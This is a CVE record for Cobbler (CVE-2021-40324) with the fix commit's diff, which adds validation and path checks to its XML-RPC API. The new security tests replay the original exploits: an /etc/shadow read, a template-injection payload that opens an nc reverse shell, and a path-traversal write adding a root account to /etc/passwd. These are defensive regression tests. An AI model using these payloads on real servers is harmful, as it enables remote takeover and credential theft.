{
  "cve_id": "CVE-2021-40324",
  "github_data": {
    "repository": "cobbler/cobbler",
    "fix_commit": "d8f60bbf14a838c8c8a1dba98086b223e35fe70a",
    "related_commits": [
      "d8f60bbf14a838c8c8a1dba98086b223e35fe70a",
      "d8f60bbf14a838c8c8a1dba98086b223e35fe70a"
    ],
    "patch_url": "https://github.com/cobbler/cobbler/commit/d8f60bbf14a838c8c8a1dba98086b223e35fe70a.patch",
    "fix_commit_details": {
      "sha": "d8f60bbf14a838c8c8a1dba98086b223e35fe70a",
      "commit_date": "2021-09-20T14:55:41Z",
      "author": {
        "login": "SchoolGuy",
        "type": "User",
        "stats": null
      },
      "commit_message": {
        "title": "Merge pull request #2794 from cobbler/fix/file-rce",
        "length": 88,
        "has_description": true,
        "references_issue": true
      },
      "stats": {
        "total": 380,
        "additions": 323,
        "deletions": 57
      },
      "files": [
        {
          "filename": "autoinstall_snippets/redhat_register",
          "status": "modified",
          "additions": 1,
          "deletions": 1,
          "patch": "@@ -1,5 +1,5 @@\n # begin Red Hat management server registration\n-#if $redhat_management_type != \"off\" and $redhat_management_key != \"\"\n+#if $redhat_management_key != \"\"\n mkdir -p /usr/share/rhn/\n    #if $redhat_management_type == \"site\"\n       #set $mycert_file = \"RHN-ORG-TRUSTED-SSL-CERT\""
        },
        {
          "filename": "cobbler/api.py",
          "status": "modified",
          "additions": 6,
          "deletions": 4,
          "patch": "@@ -178,6 +178,7 @@ def last_modified_time(self) -> float:\n \n         :returns: 0 if there is no file where the information required for this method is saved.\n         \"\"\"\n+        # FIXME: This fails in case the file required is not available\n         if not os.path.exists(\"/var/lib/cobbler/.mtime\"):\n             fd = open(\"/var/lib/cobbler/.mtime\", 'w')\n             fd.write(\"0\")\n@@ -1317,13 +1318,14 @@ def generate_bootcfg(self, profile: str, system: str) -> str:\n \n     # ==========================================================================\n \n-    def generate_script(self, profile: str, system: str, name: str) -> str:\n+    def generate_script(self, profile: Optional[str], system: Optional[str], name: str):\n         \"\"\"\n         Generate an autoinstall script for the specified profile or system. The system wins over the profile.\n \n-        :param profile: The profile to generate the script for.\n-        :param system: The system to generate the script for.\n-        :param name: The name of the script which should be generated.\n+        :param profile: The profile name to generate the script for.\n+        :param system: The system name to generate the script for.\n+        :param name: The name of the script which should be generated. Must only contain alphanumeric characters, dots\n+                     and underscores.\n         :return: The generated script or an error message.\n         \"\"\"\n         self.log(\"generate_script\")"
        },
        {
          "filename": "cobbler/remote.py",
          "status": "modified",
          "additions": 101,
          "deletions": 41,
          "patch": "@@ -21,20 +21,26 @@\n import base64\n import errno\n import fcntl\n+import keyword\n import logging\n import os\n import random\n import stat\n import time\n+import re\n import xmlrpc.server\n from socketserver import ThreadingMixIn\n from threading import Thread\n-from typing import Dict, List, Optional, Tuple, Union\n+from typing import Dict, List, Optional, Union\n from xmlrpc.server import SimpleXMLRPCRequestHandler\n \n-from cobbler import autoinstall_manager, configgen, tftpgen, utils\n+from cobbler import autoinstall_manager\n+from cobbler import configgen\n+from cobbler.items import item, package, system, image, profile, repo, mgmtclass, distro, file, menu\n+from cobbler import tftpgen\n+from cobbler import utils\n from cobbler.cexceptions import CX\n-from cobbler.items import distro, file, image, menu, mgmtclass, package, profile, repo, system\n+from cobbler.validate import validate_autoinstall_script_name, validate_obj_id, validate_obj_name\n \n EVENT_TIMEOUT = 7 * 24 * 60 * 60  # 1 week\n CACHE_TIMEOUT = 10 * 60  # 10 minutes\n@@ -122,8 +128,8 @@ def __init__(self, api):\n         :param api: The api to use for resolving the required information.\n         \"\"\"\n         self.api = api\n-        self.logger = self.api.logger\n-        self.token_cache: Dict[str, Tuple] = {}\n+        self.logger = logging.getLogger()\n+        self.token_cache: Dict[str, tuple] = {}\n         self.object_cache = {}\n         self.timestamp = self.api.last_modified_time()\n         self.events = {}\n@@ -545,31 +551,33 @@ def get_user_from_token(self, token: str):\n         :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n         :return: The username if the token was valid.\n         :raises CX: If the token supplied to the function is invalid.\n+        :raises ValueError: In case \"token\" did not fulfil the requirements to be a token.\n         \"\"\"\n+        if not CobblerXMLRPCInterface.__is_token(token):\n+            raise ValueError(\"\\\"token\\\" did not have the correct format or type!\")\n         if token not in self.token_cache:\n             raise CX(\"invalid token: %s\" % token)\n         else:\n             return self.token_cache[token][1]\n \n-    def _log(self, msg, user=None, token=None, name=None, object_id=None, attribute=None, debug: bool = False,\n-             error: bool = False):\n+    def _log(self, msg: str, token: Optional[str] = None, name: Optional[str] = None, object_id: Optional[str] = None,\n+             attribute: Optional[str] = None, debug: bool = False, error: bool = False):\n         \"\"\"\n         Helper function to write data to the log file from the XMLRPC remote implementation.\n         Takes various optional parameters that should be supplied when known.\n \n         :param msg: The message to log.\n-        :param user: When a user is associated with the action it should be supplied.\n         :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n         :param name: The name of the object should be supplied when it is known.\n         :param object_id: The object id should be supplied when it is known.\n         :param attribute: Additional attributes should be supplied if known.\n         :param debug: If the message logged is a debug message.\n         :param error: If the message logged is an error message.\n         \"\"\"\n+        if not all((isinstance(error, bool), isinstance(debug, bool), isinstance(msg, str))):\n+            return\n         # add the user editing the object, if supplied\n         m_user = \"?\"\n-        if user is not None:\n-            m_user = user\n         if token is not None:\n             try:\n                 m_user = self.get_user_from_token(token)\n@@ -579,13 +587,19 @@ def _log(self, msg, user=None, token=None, name=None, object_id=None, attribute=\n         msg = \"REMOTE %s; user(%s)\" % (msg, m_user)\n \n         if name is not None:\n+            if not validate_obj_name(name):\n+                return\n             msg = \"%s; name(%s)\" % (msg, name)\n \n         if object_id is not None:\n+            if not validate_obj_id(object_id):\n+                return\n             msg = \"%s; object_id(%s)\" % (msg, object_id)\n \n         # add any attributes being modified, if any\n         if attribute:\n+            if (isinstance(attribute, str) and attribute.isidentifier()) or keyword.iskeyword(attribute):\n+                return\n             msg = \"%s; attribute(%s)\" % (msg, attribute)\n \n         # log to the correct logger\n@@ -1842,6 +1856,10 @@ def modify_setting(self, setting_name: str, value, token: str) -> int:\n         :param token: The API-token obtained via the login() method.\n         :return: 0 on success, 1 on error.\n         \"\"\"\n+        if not self.api.settings().allow_dynamic_settings:\n+            self._log(\"modify_setting - feature turned off but was tried to be accessed\", token=token)\n+            return 1\n+        self._log(\"modify_setting(%s)\" % setting_name, token=token)\n         if not hasattr(self.api.settings(), setting_name):\n             self.logger.warning(\"Setting did not exist!\")\n             return 1\n@@ -1880,7 +1898,7 @@ def auto_add_repos(self, token: str):\n         self.api.auto_add_repos()\n         return True\n \n-    def __is_interface_field(self, field_name) -> bool:\n+    def __is_interface_field(self, field_name: str) -> bool:\n         \"\"\"\n         Checks if the field in ``f`` is related to a network interface.\n \n@@ -2276,17 +2294,20 @@ def generate_bootcfg(self, profile: str = None, system: str = None, **rest) -> s\n         self._log(\"generate_bootcfg\")\n         return self.api.generate_bootcfg(profile, system)\n \n-    def generate_script(self, profile: str = None, system: str = None, name: str = None, **rest) -> str:\n+    def generate_script(self, profile: Optional[str] = None, system: Optional[str] = None, name: str = \"\") -> str:\n         \"\"\"\n-        Not known what this does exactly.\n+        This generates the autoinstall script for a system or profile. Profile and System cannot be both given, if they\n+        are, Profile wins.\n \n-        :param profile: Not known for what the profile is needed.\n-        :param system: Not known for what the system is needed.\n-        :param name: Name of the generated script.\n-        :param rest: This is dropped in this method since it is not needed here.\n+        :param profile: The profile name to generate the script for.\n+        :param system: The system name to generate the script for.\n+        :param name: Name of the generated script. Must only contain alphanumeric characters, dots and underscores.\n         :return: Some generated script.\n         \"\"\"\n-        self._log(\"generate_script, name is %s\" % str(name))\n+        # This is duplicated from tftpgen.py to prevent log poisoning via a template engine (Cheetah, Jinja2).\n+        if not validate_autoinstall_script_name(name):\n+            raise ValueError(\"\\\"name\\\" handed to generate_script was not valid!\")\n+        self._log(\"generate_script, name is \\\"%s\\\"\" % name)\n         return self.api.generate_script(profile, system, name)\n \n     def get_blended_data(self, profile=None, system=None):\n@@ -2627,20 +2648,22 @@ def disable_netboot(self, name, token=None, **rest) -> bool:\n         self.api.sync_dhcp()\n         return True\n \n-    def upload_log_data(self, sys_name, file, size, offset, data, token=None, **rest):\n+    def upload_log_data(self, sys_name: str, file: str, size: int, offset: int, data: bytes,\n+                        token: Optional[str] = None) -> bool:\n         \"\"\"\n         This is a logger function used by the \"anamon\" logging system to upload all sorts of misc data from Anaconda.\n         As it's a bit of a potential log-flooder, it's off by default and needs to be enabled in our settings.\n \n         :param sys_name: The name of the system for which to upload log data.\n         :param file: The file where the log data should be put.\n-        :param size: The size of the data which will be recieved.\n+        :param size: The size of the data which will be received.\n         :param offset: The offset in the file where the data will be written to.\n         :param data: The data that should be logged.\n         :param token: The API-token obtained via the login() method.\n-        :param rest: This is dropped in this method since it is not needed here.\n         :return: True if everything succeeded.\n         \"\"\"\n+        if not self.__validate_log_data_params(sys_name, file, size, offset, data, token):\n+            return False\n         self._log(\"upload_log_data (file: '%s', size: %s, offset: %s)\" % (file, size, offset), token=token,\n                   name=sys_name)\n \n@@ -2650,59 +2673,82 @@ def upload_log_data(self, sys_name, file, size, offset, data, token=None, **rest\n             return False\n \n         # Find matching system record\n-        systems = self.api.systems()\n-        obj = systems.find(name=sys_name)\n+\n+        obj = self.api.find_system(name=sys_name)\n         if obj is None:\n             # system not found!\n             self._log(\"upload_log_data - WARNING - system '%s' not found in Cobbler\" % sys_name, token=token,\n                       name=sys_name)\n+            return False\n \n-        return self.__upload_file(sys_name, file, size, offset, data)\n+        return self.__upload_file(obj.name, file, size, offset, data)\n+\n+    def __validate_log_data_params(self, sys_name: str, logfile_name: str, size: int, offset: int, data: bytes,\n+                                   token: Optional[str] = None) -> bool:\n+        # Validate all types\n+        if not (isinstance(sys_name, str) and isinstance(logfile_name, str) and isinstance(size, int)\n+                and isinstance(offset, int) and isinstance(data, bytes)):\n+            self.logger.warning(\"upload_log_data - One of the parameters handed over had an invalid type!\")\n+            return False\n+        if token is not None and not isinstance(token, str):\n+            self.logger.warning(\"upload_log_data - token was given but had an invalid type.\")\n+            return False\n+        # Validate sys_name with item regex\n+        if not re.fullmatch(item.RE_OBJECT_NAME, sys_name):\n+            self.logger.warning(\"upload_log_data - The provided sys_name contained invalid characters!\")\n+            return False\n+        # Validate logfile_name - this uses the script name validation, possibly we need our own for this one later\n+        if not validate_autoinstall_script_name(logfile_name):\n+            self.logger.warning(\"upload_log_data - The provided file contained invalid characters!\")\n+            return False\n+        return True\n \n-    def __upload_file(self, sys_name, file, size, offset, data):\n+    def __upload_file(self, sys_name: str, logfile_name: str, size: int, offset: int, data: bytes) -> bool:\n         \"\"\"\n         Files can be uploaded in chunks, if so the size describes the chunk rather than the whole file. The offset\n         indicates where the chunk belongs the special offset -1 is used to indicate the final chunk.\n \n         :param sys_name: the name of the system\n-        :param file: the name of the file\n+        :param logfile_name: the name of the file\n         :param size: size of contents (bytes)\n         :param offset: the offset of the chunk\n         :param data: base64 encoded file contents\n         :return: True if the action succeeded.\n         \"\"\"\n-        contents = base64.decodestring(data)\n+        contents = base64.decodebytes(data)\n         del data\n         if offset != -1:\n             if size is not None:\n                 if size != len(contents):\n                     return False\n \n-        # XXX - have an incoming dir and move after upload complete\n-        # SECURITY - ensure path remains under uploadpath\n-        tt = str.maketrans(\"/\", \"+\")\n-        fn = str.translate(file, tt)\n-        if fn.startswith('..'):\n-            raise CX(\"invalid filename used: %s\" % fn)\n+        # FIXME: Get the base directory from Cobbler app-settings\n+        anamon_base_directory = \"/var/log/cobbler/anamon\"\n+        anamon_sys_directory = os.path.join(anamon_base_directory, sys_name)\n+\n+        file_name = os.path.join(anamon_sys_directory, logfile_name)\n+        normalized_path = os.path.normpath(file_name)\n+        if not normalized_path.startswith(anamon_sys_directory):\n+            self.logger.warning(\"upload_log_data: built path for the logfile was outside of the Cobbler-Anamon log \"\n+                                \"directory!\")\n+            return False\n \n-        # FIXME ... get the base dir from cobbler settings()\n-        udir = \"/var/log/cobbler/anamon/%s\" % sys_name\n-        if not os.path.isdir(udir):\n-            os.mkdir(udir, 0o755)\n+        if not os.path.isdir(anamon_sys_directory):\n+            os.mkdir(anamon_sys_directory, 0o755)\n \n-        fn = \"%s/%s\" % (udir, fn)\n         try:\n-            st = os.lstat(fn)\n+            st = os.lstat(file_name)\n         except OSError as e:\n             if e.errno == errno.ENOENT:\n                 pass\n             else:\n                 raise\n         else:\n             if not stat.S_ISREG(st.st_mode):\n-                raise CX(\"destination not a file: %s\" % fn)\n+                raise CX(\"destination not a file: %s\" % file_name)\n \n-        fd = os.open(fn, os.O_RDWR | os.O_CREAT, 0o644)\n+        # TODO: See if we can simplify this at a later point\n+        fd = os.open(file_name, os.O_RDWR | os.O_CREAT | os.O_CLOEXEC, 0o644)\n         # log_error(\"fd=%r\" %fd)\n         try:\n             if offset == 0 or (offset == -1 and size == len(contents)):\n@@ -3163,6 +3209,20 @@ def __make_token(self, user: str) -> str:\n         self.token_cache[b64] = (time.time(), user)\n         return b64\n \n+    @staticmethod\n+    def __is_token(token: str) -> bool:\n+        \"\"\"\n+        Simple check to validate if it is a token.\n+\n+        __make_token() uses 25 as the length of bytes that means we need to padding bytes to have a 34 character str.\n+        Because base64 specifies that the number of padding bytes are shown via equal characters, we have a 36 character\n+        long str in the end in every case.\n+\n+        :param token: The str which should be checked.\n+        :return: True in case the validation succeeds, otherwise False.\n+        \"\"\"\n+        return isinstance(token, str) and len(token) == 36\n+\n     def __invalidate_expired_tokens(self):\n         \"\"\"\n         Deletes any login tokens that might have expired. Also removes expired events."
        },
        {
          "filename": "cobbler/tftpgen.py",
          "status": "modified",
          "additions": 17,
          "deletions": 10,
          "patch": "@@ -25,12 +25,12 @@\n import os.path\n import re\n import socket\n-from typing import Dict, Optional, List\n+from typing import Dict, List, Optional\n \n-from cobbler import enums, templar\n-from cobbler import utils\n+from cobbler import enums, templar, utils\n from cobbler.cexceptions import CX\n from cobbler.enums import Archs\n+from cobbler.validate import validate_autoinstall_script_name\n \n \n class TFTPGen:\n@@ -1196,11 +1196,16 @@ def generate_script(self, what: str, objname: str, script_name: str) -> str:\n         \"\"\"\n         if what == \"profile\":\n             obj = self.api.find_profile(name=objname)\n-        else:\n+        elif what == \"system\":\n             obj = self.api.find_system(name=objname)\n+        else:\n+            raise ValueError(\"\\\"what\\\" needs to be either \\\"profile\\\" or \\\"system\\\"!\")\n+\n+        if not validate_autoinstall_script_name(script_name):\n+            raise ValueError(\"\\\"script_name\\\" handed to generate_script was not valid!\")\n \n         if not obj:\n-            return \"# %s named %s not found\" % (what, objname)\n+            return \"# \\\"%s\\\" named \\\"%s\\\" not found\" % (what, objname)\n \n         distro = obj.get_conceptual_parent()\n         while distro.get_conceptual_parent():\n@@ -1223,13 +1228,15 @@ def generate_script(self, what: str, objname: str, script_name: str) -> str:\n         else:\n             blended['img_path'] = os.path.join(\"/images\", distro.name)\n \n-        template = os.path.normpath(os.path.join(\"/var/lib/cobbler/scripts\", script_name))\n+        scripts_root = \"/var/lib/cobbler/scripts\"\n+        template = os.path.normpath(os.path.join(scripts_root, script_name))\n+        if not template.startswith(scripts_root):\n+            return \"# script template \\\"%s\\\" could not be found in the script root\" % script_name\n         if not os.path.exists(template):\n-            return \"# script template %s not found\" % script_name\n+            return \"# script template \\\"%s\\\" not found\" % script_name\n \n-        template_fh = open(template)\n-        template_data = template_fh.read()\n-        template_fh.close()\n+        with open(template) as template_fh:\n+            template_data = template_fh.read()\n \n         return self.templar.render(template_data, blended, None)\n "
        },
        {
          "filename": "cobbler/validate.py",
          "status": "modified",
          "additions": 71,
          "deletions": 0,
          "patch": "@@ -22,14 +22,17 @@\n from urllib.parse import urlparse\n from ipaddress import AddressValueError, NetmaskValueError\n from typing import Union\n+from uuid import UUID\n \n import netaddr\n \n from cobbler import enums, utils\n+from cobbler.items import item\n \n RE_HOSTNAME = re.compile(r'^([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])(\\.([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9]))*$')\n RE_URL_GRUB = re.compile(r\"^\\((?P<protocol>http|tftp),(?P<server>.*)\\)/(?P<path>.*)$\")\n RE_URL = re.compile(r'^[a-zA-Z\\d-]{,63}(\\.[a-zA-Z\\d-]{,63})*$')  # https://stackoverflow.com/a/2894918\n+RE_SCRIPT_NAME = re.compile(r\"[a-zA-Z0-9_\\-.]+\")\n \n # blacklist invalid values to the repo statement in autoinsts\n AUTOINSTALL_REPO_BLACKLIST = ['enabled', 'gpgcheck', 'gpgkey']\n@@ -606,3 +609,71 @@ def validate_grub_remote_file(value: str) -> bool:\n         success_path = urlparse(\"https://fake.local/%s\" % path).path[1:] == path\n         success = (success_server_ip or success_server_name) and success_path\n     return success\n+\n+\n+def validate_autoinstall_script_name(name: str) -> bool:\n+    \"\"\"\n+    This validates if the name given for the script is valid in the context of the API call made. It will be handed to\n+    tftpgen.py#generate_script in the end.\n+\n+    :param name: The name of the script. Will end up being a filename. May have an extension but should never be a path.\n+    :return: If this is a valid script name or not.\n+    \"\"\"\n+    if not isinstance(name, str):\n+        return False\n+    if re.fullmatch(RE_SCRIPT_NAME, name):\n+        return True\n+    return False\n+\n+\n+def validate_uuid(possible_uuid: str) -> bool:\n+    \"\"\"\n+    Validate if the handed string is a valid UUIDv4.\n+\n+    :param possible_uuid: The str with the UUID.\n+    :return: True in case it is one, False otherwise.\n+    \"\"\"\n+    if not isinstance(possible_uuid, str):\n+        return False\n+    # Taken from: https://stackoverflow.com/a/33245493/4730773\n+    try:\n+        uuid_obj = UUID(possible_uuid, version=4)\n+    except ValueError:\n+        return False\n+    return str(uuid_obj) == possible_uuid\n+\n+\n+def validate_obj_type(object_type: str) -> bool:\n+    \"\"\"\n+\n+    :param object_type:\n+    :return:\n+    \"\"\"\n+    if not isinstance(object_type, str):\n+        return False\n+    return object_type in [\"distro\", \"profile\", \"system\", \"repo\", \"image\", \"mgmtclass\", \"package\", \"file\", \"menu\"]\n+\n+\n+def validate_obj_name(object_name: str) -> bool:\n+    \"\"\"\n+\n+    :param object_name:\n+    :return:\n+    \"\"\"\n+    if not isinstance(object_name, str):\n+        return False\n+    return bool(re.fullmatch(item.RE_OBJECT_NAME, object_name))\n+\n+\n+def validate_obj_id(object_id: str) -> bool:\n+    \"\"\"\n+\n+    :param object_id:\n+    :return: True in case it is one, False otherwise.\n+    \"\"\"\n+    if not isinstance(object_id, str):\n+        return False\n+    if object_id.startswith(\"___NEW___\"):\n+        object_id = object_id[9:]\n+    (otype, oname) = object_id.split(\"::\", 1)\n+    return validate_obj_type(otype) and validate_obj_name(oname)"
        },
        {
          "filename": "tests/actions/__init__.py",
          "status": "added",
          "additions": 0,
          "deletions": 0,
          "patch": null
        },
        {
          "filename": "tests/conftest.py",
          "status": "modified",
          "additions": 1,
          "deletions": 0,
          "patch": "@@ -54,6 +54,7 @@ def cleanup_leftover_items():\n             os.remove(json_file)\n             logger.info(\"Removed file: \" + json_file)\n \n+\n @pytest.fixture(scope=\"function\")\n def fk_initrd():\n     \"\"\""
        },
        {
          "filename": "tests/special_cases/__init__.py",
          "status": "added",
          "additions": 0,
          "deletions": 0,
          "patch": null
        },
        {
          "filename": "tests/special_cases/security_test.py",
          "status": "added",
          "additions": 112,
          "deletions": 0,
          "patch": "@@ -0,0 +1,112 @@\n+\"\"\"\n+This test module tries to automatically replicate all security incidents we had in the past and checks if they fail.\n+\"\"\"\n+# SPDX-License-Identifier: GPL-2.0-or-later\n+import base64\n+import os\n+import xmlrpc.client\n+\n+import pytest\n+\n+from cobbler.utils import get_shared_secret\n+\n+\n+# ==================== Start tnpconsultants ====================\n+\n+# SPDX-FileCopyrightText: 2021 Nicolas Chatelain <nicolas.chatelain@tnpconsultants.com>\n+\n+\n+@pytest.fixture\n+def try_connect():\n+    def try_connect(url) -> xmlrpc.client.ServerProxy:\n+        xmlrpc_server = xmlrpc.client.ServerProxy(url)\n+        return xmlrpc_server\n+    return try_connect\n+\n+\n+@pytest.fixture(autouse=True)\n+def setup_profile(try_connect, create_kernel_initrd, fk_kernel, fk_initrd):\n+    cobbler_api = try_connect(\"http://localhost/cobbler_api\")\n+    shared_secret = get_shared_secret()\n+    token = cobbler_api.login(\"\", shared_secret)\n+    folder = create_kernel_initrd(fk_kernel, fk_initrd)\n+    kernel_path = os.path.join(folder, fk_kernel)\n+    initrd_path = os.path.join(folder, fk_kernel)\n+    # Create a test Distro\n+    distro = cobbler_api.new_distro(token)\n+    cobbler_api.modify_distro(distro, \"name\", \"security_test_distro\", token)\n+    cobbler_api.modify_distro(distro, \"arch\", \"x86_64\", token)\n+    cobbler_api.modify_distro(distro, \"kernel\", str(kernel_path), token)\n+    cobbler_api.modify_distro(distro, \"initrd\", str(initrd_path), token)\n+    cobbler_api.save_distro(distro, token)\n+    # Create a test Profile\n+    profile = cobbler_api.new_profile(token)\n+    cobbler_api.modify_profile(profile, \"name\", \"security_test_profile\", token)\n+    cobbler_api.modify_profile(profile, \"distro\", \"security_test_distro\", token)\n+    cobbler_api.save_profile(profile, token)\n+\n+    yield\n+\n+    cobbler_api.remove_profile(\"security_test_profile\", token)\n+    cobbler_api.remove_distro(\"security_test_distro\", token)\n+\n+\n+def test_arbitrary_file_disclosure_1(setup_profile, try_connect):\n+    # Arrange\n+    cobbler_api = try_connect(\"http://localhost/cobbler_api\")\n+\n+    # Act\n+    profiles = cobbler_api.get_profiles()\n+    target = profiles[0][\"name\"]\n+    try:\n+        result = cobbler_api.generate_script(target, \"\", \"/etc/shadow\")\n+\n+        # Assert this NOT succeeds\n+        assert not result.startswith(\"root\")\n+    except xmlrpc.client.Fault as e:\n+        # We have no way of exactly knowing what is in there but if its a ValueError we most likely caught the exploit\n+        # before something happened.\n+        assert \"ValueError\" in e.faultString\n+\n+\n+def test_template_injection_1(setup_profile, try_connect):\n+    # Arrange\n+    exploitcode = '__import__(\\'os\\').system(\\'nc [tnpitsecurity] 4242 -e /bin/sh\\')'\n+    cobbler_api = try_connect(\"http://localhost/cobbler_api\")\n+\n+    # Act\n+    profiles = cobbler_api.get_profiles()\n+    target = profiles[0][\"name\"]\n+    try:\n+        print(\"[+] Stage 1 : Poisoning log with Cheetah template RCE\")\n+        result_stage_1 = cobbler_api.generate_script(target, \"\", '{<%= ' + exploitcode + ' %>}')\n+        print(\"[+] Stage 2 : Rendering template using an arbitrary file read.\")\n+        result_stage_2 = cobbler_api.generate_script(target, \"\", \"/var/log/cobbler/cobbler.log\")\n+\n+        # Assert this NOT succeeds\n+        assert not result_stage_1.startswith(\"__import__\")\n+        # We should never get to stage two\n+    except xmlrpc.client.Fault as e:\n+        # We have no way of exactly knowing what is in there but if its a ValueError we most likely caught the exploit\n+        # before something happened.\n+        assert \"ValueError\" in e.faultString\n+\n+\n+def test_arbitrary_file_write_1(setup_profile, try_connect):\n+    # Arrange\n+    cobbler_api = try_connect(\"http://localhost/cobbler_api\")\n+    exploit = b\"cha:!:0:0:cha:/:/bin/bash\\n\"\n+\n+    # Act\n+    result = cobbler_api.upload_log_data(\n+        \"../../../../../../etc\",\n+        \"passwd\",\n+        len(exploit),\n+        100000,\n+        base64.b64encode(exploit)\n+    )\n+\n+    # Assert this NOT succeeds\n+    assert result is False\n+\n+# ==================== END tnpconsultants ===================="
        },
        {
          "filename": "tests/xmlrpcapi/miscellaneous_test.py",
          "status": "modified",
          "additions": 14,
          "deletions": 1,
          "patch": "@@ -424,7 +424,7 @@ def test_modify_setting(self, remote, token):\n         result = remote.modify_setting(\"auth_token_expiration\", 7200, token)\n \n         # Assert\n-        assert result == 0\n+        assert result == 1\n \n     def test_read_autoinstall_template(self, remote, token, create_autoinstall_template, remove_autoinstall_template):\n         # Arrange\n@@ -562,3 +562,16 @@ def test_render_vars(self, remote, token):\n \n         # Assert --> Let the test pass if the call is okay.\n         assert True\n+\n+    @pytest.mark.skip(\"Functionality is broken!\")\n+    @pytest.mark.usefixtures(\"create_testdistro\", \"create_testmenu\", \"create_testprofile\", \"create_testsystem\",\n+                             \"remove_testdistro\", \"remove_testmenu\", \"remove_testprofile\", \"remove_testsystem\")\n+    def test_upload_log_data(self, remote):\n+        # Arrange\n+\n+        # Act\n+        result = remote.upload_log_data(\"testsystem0\", \"testinstall.log\", 0, 0, b\"asdas\")\n+\n+        # Assert\n+        assert isinstance(result, bool)\n+        assert result"
        }
      ],
      "file_patterns": {
        "security_files": 1,
        "config_files": 0,
        "dependency_files": 0,
        "test_files": 5,
        "unique_directories": 6,
        "max_directory_depth": 2
      },
      "context": {
        "surrounding_commits": [
          {
            "sha": "f114bfeb366b3348cbb1578e96892d11dd12c55d",
            "date": "2024-11-17T20:42:06Z",
            "author_login": "SchoolGuy"
          },
          {
            "sha": "3bc372f934b4e2ba02fb392791604c0f243ffe4f",
            "date": "2024-11-17T20:37:12Z",
            "author_login": "SchoolGuy"
          },
          {
            "sha": "c31b8e6f171ac10c673fe62d61f020d53fa570c4",
            "date": "2024-11-17T20:33:57Z",
            "author_login": "SchoolGuy"
          },
          {
            "sha": "2b091f1f0c1b432f6325cc2f4986403671e311c2",
            "date": "2024-11-17T20:23:45Z",
            "author_login": "SchoolGuy"
          },
          {
            "sha": "0173b3d3e075e7a199a5624877e83f13c2414185",
            "date": "2024-11-17T20:13:23Z",
            "author_login": "SchoolGuy"
          }
        ]
      }
    }
  },
  "vulnerability_details": {
    "cvss_score": 7.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
    "cwe_id": "CWE-434",
    "description": "Cobbler before 3.3.0 allows arbitrary file write operations via upload_log_data.",
    "attack_vector": "NETWORK",
    "attack_complexity": "LOW"
  },
  "temporal_data": {
    "published_date": "2021-10-04T06:15:07.320",
    "last_modified": "2024-11-21T06:23:51.537",
    "fix_date": "2021-09-20T14:55:41Z"
  },
  "references": [
    {
      "url": "https://github.com/cobbler/cobbler/commit/d8f60bbf14a838c8c8a1dba98086b223e35fe70a",
      "source": "cve@mitre.org",
      "tags": [
        "Patch",
        "Third Party Advisory"
      ]
    },
    {
      "url": "https://github.com/cobbler/cobbler/releases/tag/v3.3.0",
      "source": "cve@mitre.org",
      "tags": [
        "Product",
        "Third Party Advisory"
      ]
    },
    {
      "url": "https://github.com/cobbler/cobbler/commit/d8f60bbf14a838c8c8a1dba98086b223e35fe70a",
      "source": "af854a3a-2127-422b-91ae-364da2661108",
      "tags": [
        "Patch",
        "Third Party Advisory"
      ]
    },
    {
      "url": "https://github.com/cobbler/cobbler/releases/tag/v3.3.0",
      "source": "af854a3a-2127-422b-91ae-364da2661108",
      "tags": [
        "Product",
        "Third Party Advisory"
      ]
    }
  ],
  "collection_metadata": {
    "collected_at": "2025-01-11T23:02:07.804057",
    "processing_status": "raw"
  },
  "repository_context": {
    "name": "cobbler",
    "owner": "cobbler",
    "created_at": "2011-11-08T15:01:00Z",
    "updated_at": "2025-01-02T11:34:45Z",
    "pushed_at": "2024-11-22T17:55:57Z",
    "size": 64084,
    "stars": 2645,
    "forks": 651,
    "open_issues": 327,
    "watchers": 2645,
    "has_security_policy": false,
    "default_branch": "main",
    "protected_branches": [
      "main",
      "master",
      "release20",
      "release22",
      "release24",
      "release26",
      "release28",
      "release30",
      "release32",
      "release33"
    ],
    "languages": {
      "Python": 2369730,
      "Shell": 96866,
      "Dockerfile": 22878,
      "Makefile": 6742,
      "Jinja": 307
    },
    "commit_activity": {
      "total_commits_last_year": 0,
      "avg_commits_per_week": 0,
      "days_active_last_year": 0
    },
    "security_features": {
      "has_security_policy": false,
      "has_protected_branches": true,
      "has_wiki": true,
      "has_issues": true,
      "allow_forking": true,
      "is_template": false,
      "license": "gpl-2.0"
    },
    "collected_at": "2025-01-14T15:48:31.808174"
  }
}